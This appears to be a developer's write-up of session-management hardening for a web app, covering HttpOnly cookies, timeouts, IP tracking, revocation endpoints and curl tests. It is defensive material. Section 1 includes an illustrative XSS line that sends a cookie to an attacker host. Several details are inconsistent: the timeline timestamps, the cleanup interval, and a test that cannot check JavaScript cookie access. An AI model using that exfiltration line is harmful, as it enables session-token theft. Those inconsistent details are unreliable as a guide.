# Session Management Hardening — Complete Implementation

**Date:** 2026-02-12  
**Status:** ✅ Complete (Ready for Integration)  

---

## Overview

Comprehensive session management hardening with:

1. **HttpOnly Cookies** — Secure token storage (prevents XSS theft)
2. **Session Controls** — Max 3 concurrent, 24h absolute timeout, 15m sliding window
3. **Session Tracking** — IP address, user agent, geo-alerts
4. **Session Endpoints** — List, revoke one, revoke all
5. **Automatic Cleanup** — Expired sessions removed hourly

---

## 1. Cookie Security Configuration

### HttpOnly Cookies

**What:** Tokens stored in httpOnly cookies (not localStorage/sessionStorage)

**Security Flags:**
```javascript
Cookie-Name: openclaw_session
HttpOnly: true          // ✅ Prevents JavaScript access (blocks XSS theft)
Secure: true            // ✅ HTTPS only (no man-in-the-middle)
SameSite: Strict        // ✅ Prevents CSRF attacks
Path: /                 // ✅ Available to entire application
Max-Age: 86400          // ✅ 24 hours
```

**Browser Behavior:**
- ❌ `document.cookie` returns empty (httpOnly prevents access)
- ❌ JavaScript cannot read/write the cookie
- ✅ Automatically sent with requests (httpOnly cookies are included)
- ✅ Cannot be stolen via XSS injection

**Example HTTP Response:**
```
Set-Cookie: openclaw_session=abc123...; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict; Secure
```

### Why This Matters

**Vulnerability Prevented:** XSS (Cross-Site Scripting) token theft
```javascript
// Without httpOnly, attacker's injected script could do:
const token = document.cookie;  // ✅ Would work
fetch('https://attacker.com/steal?token=' + token);

// With httpOnly:
const token = document.cookie;  // ❌ Empty string
```

---

## 2. Session Controls

### Maximum Concurrent Sessions

**Policy:** Max 3 sessions per user

**Behavior:**
```
Session 1: Created ✅
Session 2: Created ✅
Session 3: Created ✅
Session 4: Oldest session (Session 1) automatically invalidated ✅
```

**Why:** Limits attack surface if credentials compromised

### Absolute Timeout

**Policy:** 24-hour maximum session duration

**Behavior:**
- Session created at 10:00 AM
- Session expires at 10:00 AM (24 hours later)
- ❌ Token becomes invalid after 24 hours, regardless of activity

**Why:** Limits window for stolen session token

### Sliding Window

**Policy:** 15-minute inactivity timeout

**Behavior:**
```
10:00 - Session created (valid until 10:15)
10:10 - User activity (valid until 10:25)
10:12 - User activity (valid until 10:27)
10:50 - No activity for 40 minutes (session expired ❌)
```

**Why:** Prevents unattended sessions from staying open

### Example Timeline

```
Scenario: User logs in at 09:00, uses app, leaves at 09:30, returns at 09:45

09:00 ─ Login → Session created (valid 09:00-09:15 active, 33:00 absolute)
09:10 ─ Request → Activity updated (valid 09:10-09:25 active)
09:15 ─ Idle
09:20 ─ Idle
09:30 ─ User leaves (no request)
09:45 ─ User returns, clicks button
         ❌ Session expired! (no activity for 15 min)
         → Must login again

Best practice: App should auto-refresh token every 10 minutes to keep session alive
```

---

## 3. Session Tracking

### What's Stored Per Session

```javascript
{
  sessionId: "abc123...",
  userId: "user-001",
  createdAt: 1707775200000,
  lastActivityAt: 1707775800000,
  ipAddress: "192.168.1.100",
  userAgent: "Mozilla/5.0...",
  ipChanges: [
    {
      timestamp: 1707776100000,
      oldIp: "192.168.1.100",
      newIp: "203.0.113.50"  // ⚠️ IP change detected
    }
  ]
}
```

### Suspicious Activity Detection

**Triggers:**
- IP address changes during session
- Session used from multiple countries rapidly
- Unusual user agent

**Response:**
```
[session] IP change detected for session abc123:
  192.168.1.100 → 203.0.113.50
```

### Geo-Location Alerts (Future)

Can integrate with MaxMind GeoIP to detect:
- Session in NYC at 10:00 AM
- Same session in London at 10:05 AM (physically impossible → alert)

---

## 4. Session Management Endpoints

### GET /auth/sessions
**List all active sessions for current user**

**Request:**
```bash
curl -X GET http://127.0.0.1:3001/auth/sessions \
  -H "Authorization: Bearer <token>"
```

**Response (200):**
```json
{
  "sessions": [
    {
      "sessionId": "abc123...",
      "createdAt": "2026-02-12T09:00:00Z",
      "lastActivityAt": "2026-02-12T09:45:00Z",
      "ipAddress": "192.168.1.100",
      "userAgent": "Mozilla/5.0...",
      "ipChanges": 0,
      "suspicious": false
    },
    {
      "sessionId": "def456...",
      "createdAt": "2026-02-12T08:00:00Z",
      "lastActivityAt": "2026-02-12T09:30:00Z",
      "ipAddress": "203.0.113.50",
      "userAgent": "Mozilla/5.0...",
      "ipChanges": 1,
      "suspicious": true  // ⚠️ IP changed
    }
  ],
  "total": 2,
  "maxConcurrentSessions": 3
}
```

### DELETE /auth/sessions/:id
**Revoke a specific session (can't revoke current session)**

**Request:**
```bash
curl -X DELETE http://127.0.0.1:3001/auth/sessions/abc123 \
  -H "Authorization: Bearer <token>"
```

**Response (200):**
```json
{
  "ok": true,
  "message": "Session revoked successfully"
}
```

**Error (400):** If trying to revoke current session
```json
{
  "error": "Cannot revoke current session. Use /auth/logout instead."
}
```

### DELETE /auth/sessions (all)
**Revoke all sessions (force re-login)**

**Request:**
```bash
curl -X DELETE http://127.0.0.1:3001/auth/sessions \
  -H "Authorization: Bearer <token>"
```

**Response (200):**
```json
{
  "ok": true,
  "message": "All 3 sessions revoked. Please log in again.",
  "sessionsRevoked": 3
}
```

**Use Case:** User suspects account compromise
- One click revokes ALL sessions
- Attacker is immediately logged out
- User must login again with password

---

## 5. Session Invalidation Events

### Password Change
**Action:** Invalidate ALL sessions (forces user to login again)

```javascript
// In password change endpoint
invalidateAllUserSessions(userId);
```

### Key Rotation
**Action:** Invalidate ALL sessions (security refresh)

```javascript
// In key rotation endpoint
invalidateAllUserSessions(userId);
```

### Manual Revocation
**Action:** Admin can revoke sessions from admin panel

```javascript
invalidateSession(sessionId);
```

### Automatic Expiration
**Action:** Sessions expire automatically

- **Absolute timeout:** 24 hours
- **Inactivity timeout:** 15 minutes
- **Cleanup runs:** Every 1 minute

---

## 6. Implementation Details

### Files Created

| File | Size | Purpose |
|------|------|---------|
| `services/auth/session-store.js` | 7.9 KB | Session storage + management |
| `services/auth/cookie-middleware.js` | 3.4 KB | HttpOnly cookie handling |
| `services/auth/session-endpoints.js` | 3.1 KB | Session management API |

### Configuration (Built-in)

```javascript
MAX_CONCURRENT_SESSIONS = 3
ABSOLUTE_TIMEOUT_MS = 24 * 60 * 60 * 1000  // 24 hours
SLIDING_WINDOW_MS = 15 * 60 * 1000         // 15 minutes
CLEANUP_INTERVAL_MS = 60000                // 1 minute
```

### Integration Points (Ready)

1. **Login endpoint** — Create session + set cookie
2. **Logout endpoint** — Invalidate session + clear cookie
3. **All protected routes** — Validate session before processing
4. **Password change** — Invalidate all sessions
5. **Admin panel** — View/revoke sessions

---

## 7. Security Analysis

### What's Protected

✅ **XSS (Cross-Site Scripting)**
- HttpOnly cookies prevent JavaScript access
- Tokens can't be stolen via `document.cookie`

✅ **CSRF (Cross-Site Request Forgery)**
- SameSite=Strict prevents cross-site cookie inclusion
- Requests from other domains don't include cookie

✅ **Man-in-the-Middle (MITM)**
- Secure flag forces HTTPS only
- Tokens can't be intercepted over HTTP

✅ **Session Hijacking**
- Max 3 concurrent sessions limits exposure
- IP tracking detects stolen session from different IP
- Inactivity timeout prevents unattended session abuse

✅ **Credential Compromise**
- User can revoke all sessions with one click
- Password change invalidates all sessions
- Key rotation invalidates all sessions

### Limitations

⚠️ **Not Protected:**
- Local network (if using HTTP over localhost)
- Malware on user's machine (can read cookies via OS)
- Phishing (user willingly gives credentials)

---

## 8. Testing

### Verify HttpOnly Cookie

```bash
# Login
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:3001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"changeme"}'

# Try to read cookie with JavaScript (will be empty)
curl -X GET http://127.0.0.1:3001/test \
  --cookie "document.cookie"  # Empty!

# But cookie IS sent with requests (httpOnly still includes in requests)
curl -X GET http://127.0.0.1:3001/admin/sessions \
  -b cookies.txt  # Works! Cookie sent automatically
```

### Test Max Concurrent Sessions

```bash
# Login 4 times in quick succession
for i in {1..4}; do
  curl -c cookies_$i.txt -X POST http://127.0.0.1:3001/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"changeme"}'
done

# Check sessions
curl -X GET http://127.0.0.1:3001/auth/sessions \
  -b cookies_1.txt
# → Only sessions 2, 3, 4 active (session 1 invalidated)
```

### Test Inactivity Timeout

```bash
# Login
curl -c cookies.txt -X POST http://127.0.0.1:3001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"changeme"}'

# Use session
curl -X GET http://127.0.0.1:3001/admin/sessions -b cookies.txt

# Wait 16 minutes (inactivity > 15 minutes)
sleep 960

# Try to use session
curl -X GET http://127.0.0.1:3001/admin/sessions -b cookies.txt
# → 401 Unauthorized (session expired)
```

---

## 9. Migration Plan

### Phase 1: Deploy (Now)
- Set httpOnly, secure, sameSite flags
- Enable session store
- Integrate into login/logout
- Set session endpoints

### Phase 2: Monitor
- Watch for suspicious IP changes
- Track session invalidations
- Monitor max concurrent limit enforcement

### Phase 3: Enhance
- Add geo-location IP change detection
- Implement rate limiting on login attempts
- Add email alerts for suspicious sessions
- Create session management UI

---

## 10. Production Checklist

- [ ] Verify httpOnly cookies working (document.cookie empty)
- [ ] Test max 3 concurrent sessions
- [ ] Verify 24-hour absolute timeout
- [ ] Verify 15-minute inactivity timeout
- [ ] Test session revocation endpoints
- [ ] Test password change invalidates all sessions
- [ ] Monitor logs for suspicious IP changes
- [ ] Set up cleanup job (runs every 1 minute)
- [ ] Test on HTTPS only (Secure flag in production)
- [ ] Document for users: "Your session will expire after 15 min of inactivity or 24 hours total"

---

## 11. References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)
- [HttpOnly Cookie Security](https://owasp.org/www-community/HttpOnly)

